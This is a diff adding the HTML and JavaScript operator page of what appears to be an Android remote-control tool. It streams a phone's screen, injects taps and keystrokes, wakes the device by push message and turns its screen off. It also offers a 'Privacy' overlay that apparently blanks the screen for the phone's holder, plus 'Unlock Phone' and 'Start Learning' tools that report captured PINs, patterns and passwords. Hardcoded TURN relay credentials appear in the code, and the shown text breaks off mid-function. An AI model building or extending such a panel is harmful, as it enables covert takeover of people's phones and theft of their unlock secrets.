@@ -1,0 +1,937 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>REMOTE · ADMIN</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=JetBrains+Mono:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+*, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+html {
+  --g: 0,255,65;
+  --red: #00ff41;
+  --red-bright: #4dff7a;
+  --red-soft: #99ffb3;
+  --red-deep: #008a23;
+  --red-dim: rgba(var(--g), 0.10);
+  --red-dim2: rgba(var(--g), 0.20);
+  --red-glow: rgba(var(--g), 0.45);
+  --red-glow-soft: rgba(var(--g), 0.18);
+  --border-faint: rgba(var(--g), 0.07);
+  --border-dim: rgba(var(--g), 0.17);
+  --border-mid: rgba(var(--g), 0.34);
+  --bg-void: #000;
+  --txt-1: #d9ffe5;
+  --txt-2: rgba(200,255,220,0.55);
+  --txt-3: rgba(200,255,220,0.26);
+  --amber: #ffb400;
+}
+html.theme-red {
+  --g: 255,0,51; --red:#ff0033; --red-bright:#ff3b5c; --red-soft:#ff7d92; --red-deep:#a3001f;
+  --txt-1:#ffe9ed; --txt-2: rgba(255,233,237,0.55); --txt-3: rgba(255,233,237,0.26);
+}
+html.theme-blue {
+  --g: 0,212,255; --red:#00d4ff; --red-bright:#4de5ff; --red-soft:#99ebff; --red-deep:#0077a3;
+  --txt-1:#d9f3ff; --txt-2: rgba(200,235,255,0.55); --txt-3: rgba(200,235,255,0.26);
+}
+html.theme-pureblue {
+  --g: 0,0,255; --red:#0000ff; --red-bright:#4d4dff; --red-soft:#9999ff; --red-deep:#0000a3;
+  --txt-1:#e0e0ff; --txt-2: rgba(200,200,255,0.55); --txt-3: rgba(200,200,255,0.26);
+}
+html.theme-yellow {
+  --g: 255,204,0; --red:#ffcc00; --red-bright:#ffdd44; --red-soft:#ffe680; --red-deep:#a38000;
+  --txt-1:#fff7d9; --txt-2: rgba(255,245,200,0.55); --txt-3: rgba(255,245,200,0.26);
+}
+html, body {
+  font-family: 'JetBrains Mono', monospace;
+  background: var(--bg-void);
+  color: var(--txt-1);
+  height: 100vh;
+  overflow: hidden;
+  -webkit-font-smoothing: antialiased;
+  transition: color 0.35s;
+}
+body::before {
+  content: '';
+  position: fixed; inset: 0;
+  pointer-events: none; z-index: 9998;
+  background: repeating-linear-gradient(0deg,
+    rgba(var(--g),0.022) 0px, rgba(var(--g),0.022) 1px, transparent 1px, transparent 3px);
+  opacity: 0.5;
+}
+
+/* ── Header ── */
+#hd {
+  height: 46px;
+  background: rgba(0,0,0,0.7);
+  backdrop-filter: blur(6px);
+  border-bottom: 1px solid var(--border-dim);
+  display: flex; align-items: center; justify-content: space-between;
+  padding: 0 16px;
+  position: relative;
+  z-index: 10;
+  gap: 10px;
+}
+#hd::after {
+  content: '';
+  position: absolute; bottom: -1px; left: 0; right: 0; height: 1px;
+  background: linear-gradient(90deg, transparent, var(--red) 20%, var(--red-bright) 50%, var(--red) 80%, transparent);
+  box-shadow: 0 0 12px var(--red-glow);
+  opacity: 0.85;
+}
+.hd-left { display: flex; align-items: center; gap: 12px; flex: 1; min-width: 0; }
+.hd-right { display: flex; align-items: center; gap: 8px; flex-shrink: 0; }
+#hd-back {
+  background: transparent;
+  border: 1px solid var(--border-dim);
+  color: var(--txt-3);
+  padding: 5px 10px;
+  border-radius: 4px;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 10px; font-weight: 700;
+  letter-spacing: 0.14em;
+  cursor: pointer;
+  text-transform: uppercase;
+}
+#hd-back:hover { border-color: var(--red); color: var(--red-bright); background: var(--red-dim); }
+#hd-device {
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 13px;
+  letter-spacing: 0.16em;
+  color: var(--red-bright);
+  text-shadow: 0 0 8px var(--red-glow-soft);
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+}
+#hd-device .id { color: var(--txt-3); font-size: 11px; margin-left: 8px; letter-spacing: 0.1em; }
+.hd-btn {
+  background: rgba(10,12,10,0.9);
+  border: 1px solid var(--border-dim);
+  border-radius: 4px;
+  padding: 6px 12px;
+  color: var(--txt-2);
+  font-size: 10px; font-weight: 700;
+  font-family: 'JetBrains Mono', monospace;
+  cursor: pointer;
+  letter-spacing: 0.12em;
+  text-transform: uppercase;
+  transition: all 0.15s;
+}
+.hd-btn:hover { border-color: var(--red); color: var(--red-bright); background: var(--red-dim); }
+.hd-btn.danger { color: #ff6666; border-color: rgba(255,60,60,0.25); }
+.hd-btn.danger:hover { color: #fff; border-color: #ff4444; background: rgba(255,60,60,0.2); }
+.hd-btn.active { background: var(--red); color: #000; border-color: var(--red); box-shadow: 0 0 14px var(--red-glow); }
+
+/* ── Stream ── */
+#stream-wrap {
+  position: absolute;
+  top: 46px;
+  left: 0; right: 0;
+  bottom: 52px;
+  background: #000;
+  overflow: hidden;
+  cursor: crosshair;
+}
+#v-canvas { position: absolute; display: none; }
+#v-video { position: absolute; display: none; object-fit: contain; }
+
+/* ── Toolbar ── */
+#tb {
+  position: fixed;
+  bottom: 0; left: 0; right: 0;
+  height: 52px;
+  background: #050805;
+  border-top: 1px solid var(--border-dim);
+  display: flex; align-items: center; justify-content: space-between;
+  padding: 0 16px;
+  gap: 8px;
+  z-index: 10;
+}
+#tb::before {
+  content: '';
+  position: absolute; top: -1px; left: 0; right: 0; height: 1px;
+  background: linear-gradient(90deg, transparent, var(--red) 20%, var(--red-bright) 50%, var(--red) 80%, transparent);
+  box-shadow: 0 0 10px var(--red-glow);
+  opacity: 0.7;
+}
+.tb-group { display: flex; gap: 4px; }
+.tb-btn {
+  background: #0c100c;
+  border: 1px solid var(--border-dim);
+  border-radius: 4px;
+  padding: 7px 12px;
+  color: var(--txt-2);
+  font-size: 10px; font-weight: 700;
+  font-family: 'JetBrains Mono', monospace;
+  cursor: pointer;
+  display: flex; align-items: center;
+  gap: 5px;
+  letter-spacing: 0.1em;
+  text-transform: uppercase;
+  transition: all 0.15s;
+  white-space: nowrap;
+}
+.tb-btn:hover { background: #161e16; border-color: var(--border-mid); color: var(--txt-1); }
+.tb-btn svg { width: 12px; height: 12px; flex-shrink: 0; }
+.tb-btn.purple {
+  background: var(--red-dim);
+  border-color: var(--border-mid);
+  color: var(--red-soft);
+}
+.tb-btn.purple:hover { background: var(--red-dim2); border-color: var(--red); color: var(--red-bright); }
+.tb-btn.privacy-on {
+  background: var(--red);
+  border-color: var(--red);
+  color: #000;
+  box-shadow: 0 0 14px var(--red-glow);
+}
+.tb-btn.danger { color: #ff6666; border-color: rgba(255,60,60,0.3); }
+.tb-btn.danger:hover { background: rgba(255,60,60,0.2); color: #fff; border-color: #ff4444; }
+
+/* ── Keyboard modal ── */
+#kb-modal {
+  display: none;
+  position: fixed;
+  inset: 0;
+  background: rgba(0,0,0,0.75);
+  backdrop-filter: blur(8px);
+  z-index: 100;
+  align-items: center; justify-content: center;
+}
+#kb-modal.show { display: flex; }
+#kb-box {
+  background: rgba(10,12,10,0.95);
+  border: 1px solid var(--border-mid);
+  border-radius: 10px;
+  padding: 22px;
+  width: 100%; max-width: 480px;
+  display: flex; flex-direction: column; gap: 14px;
+  box-shadow: 0 0 60px var(--red-glow-soft);
+}
+#kb-box h3 {
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 14px; letter-spacing: 0.2em; text-transform: uppercase;
+  color: var(--txt-1);
+}
+#kb-input {
+  background: rgba(7,9,7,0.9);
+  border: 1px solid var(--border-dim);
+  border-radius: 5px;
+  padding: 12px 14px;
+  color: var(--txt-1);
+  font-size: 13px;
+  font-family: 'JetBrains Mono', monospace;
+  outline: none;
+  width: 100%;
+}
+#kb-input:focus { border-color: var(--red); box-shadow: 0 0 14px var(--red-glow-soft); }
+#kb-btns { display: flex; gap: 8px; justify-content: flex-end; }
+
+/* ── Tools modal ── */
+#tools-modal {
+  display: none;
+  position: fixed;
+  inset: 0;
+  background: rgba(0,0,0,0.75);
+  backdrop-filter: blur(8px);
+  z-index: 100;
+  align-items: center; justify-content: center;
+}
+#tools-modal.show { display: flex; }
+#tools-box {
+  background: rgba(10,12,10,0.95);
+  border: 1px solid var(--border-mid);
+  border-radius: 10px;
+  padding: 22px;
+  width: 100%; max-width: 340px;
+  display: flex; flex-direction: column; gap: 8px;
+  box-shadow: 0 0 60px var(--red-glow-soft);
+}
+#tools-box h3 {
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 14px; letter-spacing: 0.2em; text-transform: uppercase;
+  color: var(--txt-1);
+  margin-bottom: 6px;
+}
+.tool-btn {
+  background: var(--red-dim);
+  border: 1px solid var(--border-mid);
+  border-radius: 5px;
+  padding: 12px 16px;
+  color: var(--red-soft);
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px; font-weight: 700;
+  cursor: pointer;
+  text-align: left;
+  letter-spacing: 0.12em;
+  text-transform: uppercase;
+  transition: all 0.15s;
+}
+.tool-btn:hover { background: var(--red-dim2); color: var(--red-bright); border-color: var(--red); }
+.tool-btn.danger { color: #ff6666; border-color: rgba(255,60,60,0.3); }
+.tool-btn.danger:hover { background: rgba(255,60,60,0.2); color: #fff; }
+
+/* ── Stats overlay ── */
+#stats {
+  position: absolute;
+  top: 56px; left: 14px;
+  z-index: 5;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px;
+  line-height: 1.55;
+  color: var(--red);
+  white-space: pre;
+  pointer-events: none;
+  text-shadow:
+    0 0 6px var(--red-glow),
+    0 0 14px var(--red-glow-soft),
+    1px 1px 2px rgba(0,0,0,0.9),
+    -1px -1px 2px rgba(0,0,0,0.9);
+  display: none;
+}
+#stats.show { display: block; }
+
+/* ── Connecting overlay ── */
+#conn {
+  position: fixed;
+  inset: 0;
+  background: rgba(0,0,0,0.92);
+  backdrop-filter: blur(14px);
+  display: flex; flex-direction: column;
+  align-items: center; justify-content: center;
+  gap: 18px;
+  z-index: 200;
+}
+#conn.hidden { display: none; }
+.spinner {
+  width: 54px; height: 54px;
+  border-radius: 50%;
+  border: 2px solid var(--red-dim);
+  border-top-color: var(--red);
+  border-right-color: var(--red-bright);
+  animation: spin 0.75s linear infinite;
+  box-shadow: 0 0 26px var(--red-glow-soft);
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+#conn-status {
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 16px; letter-spacing: 0.22em; text-transform: uppercase;
+  color: var(--red);
+  text-shadow: 0 0 12px var(--red-glow);
+}
+#conn-sub { font-size: 10px; color: var(--txt-3); letter-spacing: 0.14em; text-transform: uppercase; }
+#conn-cancel {
+  background: var(--red-dim);
+  border: 1px solid var(--border-mid);
+  color: var(--red-bright);
+  border-radius: 5px;
+  padding: 9px 24px;
+  font-size: 10.5px; font-weight: 700;
+  font-family: 'JetBrains Mono', monospace;
+  letter-spacing: 0.2em;
+  text-transform: uppercase;
+  cursor: pointer;
+  margin-top: 6px;
+}
+#conn-cancel:hover { background: var(--red-dim2); border-color: var(--red); }
+
+::-webkit-scrollbar { width: 6px; }
+::-webkit-scrollbar-track { background: #050805; }
+::-webkit-scrollbar-thumb { background: var(--red-deep); }
+</style>
+</head>
+<body>
+
+<!-- Header -->
+<div id="hd">
+  <div class="hd-left">
+    <button id="hd-back" title="Back to admin">← Admin</button>
+    <div id="hd-device">Loading…<span class="id"></span></div>
+  </div>
+  <div class="hd-right">
+    <button class="hd-btn" id="hd-mode" title="Switch stream mode">MODE: WEBRTC</button>
+    <button class="hd-btn" id="hd-stats" title="Toggle stats">STATS</button>
+    <button class="hd-btn danger" id="hd-close" title="Close session">Disconnect</button>
+  </div>
+</div>
+
+<!-- Stream -->
+<div id="stream-wrap">
+  <canvas id="v-canvas"></canvas>
+  <video id="v-video" autoplay playsinline></video>
+</div>
+<pre id="stats"></pre>
+
+<!-- Toolbar -->
+<div id="tb">
+  <div class="tb-group">
+    <button class="tb-btn purple" id="tb-type">
+      <svg viewBox="0 0 24 24" fill="none"><rect x="2" y="6" width="20" height="13" rx="2" stroke="currentColor" stroke-width="1.8"/><path d="M6 10h.01M10 10h.01M14 10h.01M18 10h.01M6 14h.01M10 14h.01M14 14h.01M18 14h.01" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/></svg>
+      Type
+    </button>
+    <button class="tb-btn purple" id="tb-privacy">
+      <svg viewBox="0 0 24 24" fill="none"><rect x="3" y="11" width="18" height="11" rx="2" stroke="currentColor" stroke-width="1.8"/><path d="M7 11V7a5 5 0 0110 0v4" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/></svg>
+      Privacy
+    </button>
+    <button class="tb-btn purple" id="tb-son">☀ On</button>
+    <button class="tb-btn purple" id="tb-soff">☾ Off</button>
+    <button class="tb-btn purple" id="tb-tools">
+      <svg viewBox="0 0 24 24" fill="none"><path d="M14.7 6.3a1 1 0 000 1.4l1.6 1.6a1 1 0 001.4 0l3.77-3.77a6 6 0 01-7.94 7.94l-6.91 6.91a2.12 2.12 0 01-3-3l6.91-6.91a6 6 0 017.94-7.94l-3.77 3.77z" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      Tools
+    </button>
+  </div>
+  <div class="tb-group">
+    <button class="tb-btn" id="tb-back">← Back</button>
+    <button class="tb-btn" id="tb-home">◉ Home</button>
+    <button class="tb-btn" id="tb-recents">▣ Recents</button>
+  </div>
+</div>
+
+<!-- Keyboard modal -->
+<div id="kb-modal">
+  <div id="kb-box">
+    <h3>Type on device</h3>
+    <input id="kb-input" type="text" placeholder="Type text and press Enter…" autocomplete="off"/>
+    <div id="kb-btns">
+      <button class="tb-btn" id="kb-cancel">Cancel</button>
+      <button class="tb-btn purple" id="kb-send">Send</button>
+    </div>
+  </div>
+</div>
+
+<!-- Tools modal -->
+<div id="tools-modal">
+  <div id="tools-box">
+    <h3>Device Tools</h3>
+    <button class="tool-btn" id="tool-unlock">🔓 Unlock Phone</button>
+    <button class="tool-btn" id="tool-verify">✓ Confirm / Verify</button>
+    <button class="tool-btn" id="tool-learn">◐ Start Learning</button>
+    <button class="tool-btn danger" id="tool-stoplearn">■ Stop & Save</button>
+    <div id="tools-result" style="font-family:'JetBrains Mono',monospace;font-size:10.5px;color:var(--txt-3);background:rgba(2,5,3,0.9);border:1px solid var(--border-faint);border-radius:5px;padding:10px;min-height:36px;margin-top:6px;line-height:1.6;word-break:break-all;">—</div>
+    <button class="tb-btn" id="tools-close" style="align-self:flex-end;margin-top:6px;">Close</button>
+  </div>
+</div>
+
+<!-- Connecting overlay -->
+<div id="conn">
+  <div class="spinner"></div>
+  <div id="conn-status">Connecting…</div>
+  <div id="conn-sub">Please wait</div>
+  <button id="conn-cancel">Cancel</button>
+</div>
+
+<script>
+// ═══════════════════════════════════════════════════════════════════════
+//  BOOT — read URL params, load theme, get deviceId
+// ═══════════════════════════════════════════════════════════════════════
+const params = new URLSearchParams(location.search);
+const DEVICE_ID = (params.get('device') || '').toUpperCase();
+const SERVER_URL = `wss://${location.host}`;
+const SERVER_HTTP = `https://${location.host}`;
+const ADMIN_TOKEN = localStorage.getItem('admin_token') || '';
+
+// Theme — shared with admin
+const THEMES = ['green','red','blue','pureblue','yellow'];
+let currentTheme = localStorage.getItem('admin_theme') || 'green';
+if (THEMES.includes(currentTheme) && currentTheme !== 'green') {
+  document.documentElement.classList.add('theme-' + currentTheme);
+}
+
+if (!DEVICE_ID) {
+  document.getElementById('conn-status').textContent = 'No device specified';
+  document.getElementById('conn-sub').textContent = 'Missing ?device= parameter';
+} else {
+  document.getElementById('hd-device').innerHTML =
+    `Remote Session<span class="id">${DEVICE_ID}</span>`;
+}
+
+// ═══════════════════════════════════════════════════════════════════════
+//  STATE
+// ═══════════════════════════════════════════════════════════════════════
+let ws = null;
+let pc = null;
+let isConnected = false;
+let currentMode = 'webrtc';
+let chosenMode = 'webrtc';
+let hostWidth = 540, hostHeight = 1200;
+let isMouseDown = false, touchStartX = 0, touchStartY = 0;
+let longPressTimer = null, longPressTriggered = false;
+let dragActive = false, lastMoveSent = 0;
+const DRAG_THRESHOLD = 8, MOVE_INTERVAL_MS = 25;
+let privacyActive = false;
+let statsOn = false;
+let statsTimer = null;
+let ctrlRtt = null;
+let lastBytes = 0, lastTs = 0;
+const ss = { bytes:0, recv:0, drawn:0, dropped:0, full:0, tiles:0, drawMs:0, lastDrawn:0 };
+let ssPrev = null;
+
+const TILE_SIZE = 128;
+const ICE_SERVERS = [
+  { urls: 'stun:stun.l.google.com:19302' },
+  { urls: 'turn:global.relay.metered.ca:3478', username: '08b366d03e6dd4417ef37db4', credential: 'dFZ8cga1HZWUUo8T' },
+  { urls: 'turn:global.relay.metered.ca:3478?transport=tcp', username: '08b366d03e6dd4417ef37db4', credential: 'dFZ8cga1HZWUUo8T' },
+  { urls: 'turn:global.relay.metered.ca:80', username: '08b366d03e6dd4417ef37db4', credential: 'dFZ8cga1HZWUUo8T' },
+  { urls: 'turn:global.relay.metered.ca:443', username: '08b366d03e6dd4417ef37db4', credential: 'dFZ8cga1HZWUUo8T' },
+  { urls: 'turn:global.relay.metered.ca:443?transport=tcp', username: '08b366d03e6dd4417ef37db4', credential: 'dFZ8cga1HZWUUo8T' }
+];
+
+// ═══════════════════════════════════════════════════════════════════════
+//  AUDIO BEEP (subtle)
+// ═══════════════════════════════════════════════════════════════════════
+let audioCtx = null;
+function beep(freq = 880, dur = 0.05, vol = 0.04) {
+  try {
+    if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+    const o = audioCtx.createOscillator(), g = audioCtx.createGain();
+    o.type = 'square'; o.frequency.value = freq;
+    g.gain.setValueAtTime(vol, audioCtx.currentTime);
+    g.gain.exponentialRampToValueAtTime(0.0001, audioCtx.currentTime + dur);
+    o.connect(g).connect(audioCtx.destination);
+    o.start(); o.stop(audioCtx.currentTime + dur);
+  } catch(_) {}
+}
+
+// ═══════════════════════════════════════════════════════════════════════
+//  WEBSOCKET + WEBRTC
+// ═══════════════════════════════════════════════════════════════════════
+function connect() {
+  if (!DEVICE_ID) return;
+
+  ws = new WebSocket(SERVER_URL);
+  ws.binaryType = 'arraybuffer';
+
+  ws.onopen = () => {
+    document.getElementById('conn-status').textContent = 'Joining room…';
+    ws.send(JSON.stringify({ type: 'join', room: DEVICE_ID, role: 'controller' }));
+    ws.send(JSON.stringify({ type: 'stream-mode-choice', mode: chosenMode }));
+    if (chosenMode === 'webrtc') setupWebRTC();
+  };
+
+  ws.onmessage = async (ev) => {
+    if (ev.data instanceof ArrayBuffer) {
+      if (currentMode === 'screenshot') {
+        ss.bytes += ev.data.byteLength;
+        ss.recv++;
+        handleFrame(new Uint8Array(ev.data));
+      }
+      return;
+    }
+    let data;
+    try { data = JSON.parse(ev.data); } catch(_) { return; }
+
+    if (data.type === 'host-ready') {
+      document.getElementById('conn-status').textContent = 'Host ready';
+      document.getElementById('conn-sub').textContent = 'Waiting for stream…';
+    }
+    else if (data.type === 'waiting-for-host') {
+      document.getElementById('conn-status').textContent = 'Waking host…';
+      document.getElementById('conn-sub').textContent = 'Sending FCM wake';
+    }
+    else if (data.type === 'streaming-started') {
+      document.getElementById('conn').classList.add('hidden');
+      isConnected = true;
+      beep(880, 0.06); setTimeout(() => beep(1320, 0.09), 70);
+      if (data.mode === 'webrtc') switchToWebRTC();
+      else switchToScreenshot(data.mode === 'accessibility' ? 'Accessibility' : 'Screenshot');
+      if (statsOn) startStats();
+    }
+    else if (data.type === 'dimensions') {
+      hostWidth = data.width;
+      hostHeight = data.height;
+      const c = document.getElementById('v-canvas');
+      c.width = hostWidth; c.height = hostHeight;
+      fit();
+    }
+    else if (data.type === 'mode') {
+      if (data.value === 'screenshot') switchToScreenshot('Screenshot');
+      else if (data.value === 'accessibility') switchToScreenshot('Accessibility');
+      else if (data.value === 'webrtc') switchToWebRTC();
+    }
+    else if (data.type === 'overlay_stopped') {
+      privacyActive = false;
+      document.getElementById('tb-privacy').classList.remove('privacy-on');
+    }
+    else if (data.type === 'unlock_result') {
+      document.getElementById('tools-result').textContent =
+        data.success ? '✅ Unlock succeeded' : '❌ ' + (data.reason || 'unlock failed');
+    }
+    else if (data.type === 'learn_result') {
+      const label = data.unlock_type === 'pin' ? 'PIN' : data.unlock_type === 'pattern' ? 'Pattern' : 'Password';
+      document.getElementById('tools-result').textContent = `Saved — ${label}: ${data.value}`;
+    }
+    else if (data.type === 'learn_status') {
+      document.getElementById('tools-result').textContent =
+        data.status === 'started' ? 'Learning active…' : data.status;
+    }
+    else if (data.type === 'offer') {
+      if (!pc) return;
+      await pc.setRemoteDescription({ type: 'offer', sdp: data.sdp });
+      const ans = await pc.createAnswer();
+      let sdp = ans.sdp;
+      sdp = sdp.replace(/b=AS:\d+\r\n/g,'').replace(/b=TIAS:\d+\r\n/g,'');
+      sdp = sdp.replace(/a=mid:video\r\n/g, 'a=mid:video\r\nb=AS:30000\r\nb=TIAS:30000000\r\n');
+      await pc.setLocalDescription({ type: 'answer', sdp });
+      ws.send(JSON.stringify({ type: 'answer', sdp }));
+    }
+    else if (data.type === 'ice') {
+      if (!pc) return;
+      try { await pc.addIceCandidate({ candidate: data.candidate, sdpMid: data.sdpMid, sdpMLineIndex: data.sdpMLineIndex }); } catch(_) {}
+    }
+    else if (data.type === 'pong') {
+      ctrlRtt = Date.now() - data.t;
+    }
+    else if (data.type === 'peer-left') {
+      disconnect('Host disconnected');
+    }
+  };
+
+  ws.onclose = () => {
+    if (isConnected) disconnect('Connection lost');
+  };
+  ws.onerror = () => { console.log('ws error'); };
+}
+
+function setupWebRTC() {
+  pc = new RTCPeerConnection({ iceServers: ICE_SERVERS, sdpSemantics: 'unified-plan' });
+  pc.onicecandidate = e => {
+    if (e.candidate && ws?.readyState === WebSocket.OPEN) {
+      ws.send(JSON.stringify({ type:'ice', candidate: e.candidate.candidate, sdpMid: e.candidate.sdpMid, sdpMLineIndex: e.candidate.sdpMLineIndex }));
+    }
+  };
+  pc.ontrack = e => {
+    const v = document.getElementById('v-video');
+    v.srcObject = e.streams[0];
+    try { e.receiver.jitterBufferTarget = 0; } catch(_) {}
+    try { e.receiver.playoutDelayHint = 0; } catch(_) {}
+  };
+  pc.oniceconnectionstatechange = () => {
+    if (pc.iceConnectionState === 'failed') {
+      document.getElementById('conn-status').textContent = 'WebRTC failed';
+    }
+  };
+}
+
+function sendMsg(o) {
+  if (ws?.readyState === WebSocket.OPEN) ws.send(JSON.stringify(o));
+}
+
+// ═══════════════════════════════════════════════════════════════════════
+//  MODE SWITCHING + FIT
+// ═══════════════════════════════════════════════════════════════════════
+function switchToWebRTC() {
+  currentMode = 'webrtc';
+  document.getElementById('v-canvas').style.display = 'none';
+  document.getElementById('v-video').style.display = 'block';
+  document.getElementById('hd-mode').textContent = 'MODE: WEBRTC';
+  fit();
+}
+function switchToScreenshot(label = 'Screenshot') {
+  currentMode = 'screenshot';
+  document.getElementById('v-video').style.display = 'none';
+  document.getElementById('v-canvas').style.display = 'block';
+  document.getElementById('hd-mode').textContent = 'MODE: ' + label.toUpperCase();
+  fit();
+}
+
+function fit() {
+  const wrap = document.getElementById('stream-wrap');
+  const canvas = document.getElementById('v-canvas');
+  const video = document.getElementById('v-video');
+  const cW = wrap.clientWidth, cH = wrap.clientHeight;
+  if (!cW || !cH) return;
+  const ratio = hostWidth / hostHeight;
+  const cR = cW / cH;
+  let w, h;
+  if (cR > ratio) { h = cH; w = h * ratio; } else { w = cW; h = w / ratio; }
+  const L = Math.round((cW - w) / 2), T = Math.round((cH - h) / 2);
+  [canvas, video].forEach(el => {
+    el.style.width = Math.round(w) + 'px';
+    el.style.height = Math.round(h) + 'px';
+    el.style.left = L + 'px';
+    el.style.top = T + 'px';
+  });
+}
+window.addEventListener('resize', fit);
+
+// ═══════════════════════════════════════════════════════════════════════
+//  SCREENSHOT FRAME DECODER
+// ═══════════════════════════════════════════════════════════════════════
+async function handleFrame(data) {
+  const canvas = document.getElementById('v-canvas');
+  const ctx = canvas.getContext('2d');
+  const type = data[0];
+  if (type === 0) {
+    const blob = new Blob([data.slice(1)], { type: 'image/jpeg' });
+    const bmp = await createImageBitmap(blob);
+    ctx.drawImage(bmp, 0, 0, hostWidth, hostHeight);
+    bmp.close();
+    ss.full++;
+  } else if (type === 1) {
+    let off = 2;
+    const n = data[1];
+    const proms = [];
+    for (let i = 0; i < n; i++) {
+      const col = data[off++], row = data[off++];
+      const w = data[off++], h = data[off++];
+      const len = ((data[off]&0xFF)<<24)|((data[off+1]&0xFF)<<16)|((data[off+2]&0xFF)<<8)|(data[off+3]&0xFF);
+      off += 4;
+      const bytes = data.slice(off, off + len);
+      off += len;
+      const x = col * TILE_SIZE, y = row * TILE_SIZE;
+      const blob = new Blob([bytes], { type: 'image/jpeg' });
+      proms.push(createImageBitmap(blob).then(b => ({ b, x, y })));
+    }
+    const imgs = await Promise.all(proms);
+    imgs.forEach(({ b, x, y }) => { ctx.drawImage(b, x, y); b.close(); });
+    ss.tiles++;
+  }
+  ss.drawn++;
+  ss.lastDrawn = performance.now();
+}
+
+// ═══════════════════════════════════════════════════════════════════════
+//  MOUSE / TOUCH CONTROL
+// ═══════════════════════════════════════════════════════════════════════
+function getActiveEl() {
+  return currentMode === 'webrtc' ? document.getElementById('v-video') : document.getElementById('v-canvas');
+}
+function coords(e) {
+  const r = getActiveEl().getBoundingClientRect();
+  const x = (e.clientX - r.left) / r.width;
+  const y = (e.clientY - r.top) / r.height;
+  if (x < 0 || x > 1 || y < 0 || y > 1) return null;
+  return { x, y };
+}
+function clampedCoords(e) {
+  const r = getActiveEl().getBoundingClientRect();
+  return {
+    x: Math.min(1, Math.max(0, (e.clientX - r.left) / r.width)),
+    y: Math.min(1, Math.max(0, (e.clientY - r.top) / r.height)),
+  };
+}
+
+const wrap = document.getElementById('stream-wrap');
+wrap.addEventListener('mousedown', e => {
+  const c = coords(e);
+  if (!c) return;
+  isMouseDown = true;
+  touchStartX = e.clientX; touchStartY = e.clientY;
+  longPressTriggered = false; dragActive = false;
+  lastMoveSent = 0;
+  longPressTimer = setTimeout(() => {
+    if (isMouseDown) {
+      const cc = coords({ clientX: touchStartX, clientY: touchStartY });
+      if (cc) { sendMsg({ type:'longpress', x:cc.x, y:cc.y }); longPressTriggered = true; }
+    }
+  }, 500);
+});
+window.addEventListener('mousemove', e => {
+  if (!isMouseDown) return;
+  if (!dragActive) {
+    const dx = e.clientX - touchStartX, dy = e.clientY - touchStartY;
+    if (Math.hypot(dx, dy) <= DRAG_THRESHOLD) return;
+    clearTimeout(longPressTimer);
+    if (longPressTriggered) return;
+    dragActive = true;
+    const s = clampedCoords({ clientX: touchStartX, clientY: touchStartY });
+    sendMsg({ type:'drag_start', x:s.x, y:s.y, t: Date.now() });
+  }
+  const now = Date.now();
+  if (now - lastMoveSent < MOVE_INTERVAL_MS) return;
+  lastMoveSent = now;
+  const c = clampedCoords(e);
+  sendMsg({ type:'drag_move', x:c.x, y:c.y, t: now });
+});
+window.addEventListener('mouseup', e => {
+  if (!isMouseDown) return;
+  isMouseDown = false;
+  clearTimeout(longPressTimer);
+  if (dragActive) {
+    dragActive = false;
+    const c = clampedCoords(e);
+    sendMsg({ type:'drag_end', x:c.x, y:c.y, t: Date.now() });
+    return;
+  }
+  if (longPressTriggered) { longPressTriggered = false; return; }
+  const c = coords(e);
+  if (!c) return;
+  sendMsg({ type:'touch', x:c.x, y:c.y, action:'tap' });
+});
+wrap.addEventListener('wheel', e => {
+  e.preventDefault();
+  const c = coords(e);
+  if (!c) return;
+  const delta = e.deltaY !== 0 ? e.deltaY : e.deltaX;
+  sendMsg({ type:'scroll', x:c.x, y:c.y, deltaX:0, deltaY: Math.sign(delta) * 0.003 });
+}, { passive: false });
+
+// Keyboard shortcuts (when not typing)
+document.addEventListener('keydown', e => {
+  if (e.target === document.getElementById('kb-input')) return;
+  if (e.repeat) return;
+  if (e.key === 'Backspace') { e.preventDefault(); sendMsg({ type:'keyboard', text:'\b' }); }
+  else if (e.key === 'Enter') { sendMsg({ type:'keyboard', text:'\n' }); }
+  else if (e.key.length === 1) { sendMsg({ type:'keyboard', text: e.key }); }
+});
+
+// ═══════════════════════════════════════════════════════════════════════
+//  TOOLBAR BUTTONS
+// ═══════════════════════════════════════════════════════════════════════
+document.getElementById('tb-back').addEventListener('click', () => sendMsg({ type:'system', action:'back' }));
+document.getElementById('tb-home').addEventListener('click', () => sendMsg({ type:'system', action:'home' }));
+document.getElementById('tb-recents').addEventListener('click', () => sendMsg({ type:'system', action:'recents' }));
+
+document.getElementById('tb-son').addEventListener('click', () => {
+  sendMsg({ type:'screen_on' });
+  const b = document.getElementById('tb-son');
+  const o = b.textContent; b.textContent = 'Sent';
+  setTimeout(() => b.textContent = o, 1200);
+});
+document.getElementById('tb-soff').addEventListener('click', () => {
+  sendMsg({ type:'screen_off' });
+  const b = document.getElementById('tb-soff');
+  const o = b.textContent; b.textContent = 'Sent';
+  setTimeout(() => b.textContent = o, 1200);
+});
+
+document.getElementById('tb-privacy').addEventListener('click', () => {
+  const btn = document.getElementById('tb-privacy');
+  if (!privacyActive) {
+    sendMsg({ type:'overlay_start' });
+    privacyActive = true;
+    btn.classList.add('privacy-on');
+  } else {
+    sendMsg({ type:'overlay_stop' });
+    privacyActive = false;
+    btn.classList.remove('privacy-on');
+  }
+});
+
+// Keyboard modal
+function showKb() { document.getElementById('kb-modal').classList.add('show'); document.getElementById('kb-input').focus(); }
